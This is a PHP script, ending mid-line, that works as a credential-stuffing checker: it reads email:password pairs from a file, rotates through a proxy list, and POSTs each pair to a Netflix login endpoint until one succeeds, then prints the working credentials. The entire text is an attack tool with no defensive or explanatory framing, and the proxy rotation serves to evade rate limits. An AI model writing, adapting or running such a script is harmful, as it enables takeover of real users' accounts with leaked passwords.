<?php
// Open the list of passwords
$file = fopen("passwords.txt", "r");

// Open the list of proxies
$proxies = fopen("proxies.txt", "r");

// Loop through the list of passwords
while(!feof($file)) {
    // Get the next password
    $line = trim(fgets($file));
    //split the line with :
    list($email, $password) = explode(':', $line);
    // Get the next proxy
    $proxy = trim(fgets($proxies));

    // Set up cURL
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => "https://www.netflix.com/api/login",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => "email=$email&password=$password",
        CURLOPT_HTTPHEADER => array(
            "Content-Type: application/x-www-form-urlencoded"
        ),
        CURLOPT_PROXY => $proxy,
    ));

    // Send the request and save the response
    $response = curl_exec($curl);
    $err = curl_error($curl);

    // Close cURL
    curl_close($curl);

    // Decode the JSON response
    $data = json_decode($response);

    // Check if the login was successful
    if ($data->status == "success") {
        echo "Found a match: $email:$password";
        break;
    } else {
        echo "Trying $email:$password...\n";
    }
}
fclose($file);
fclose($pro
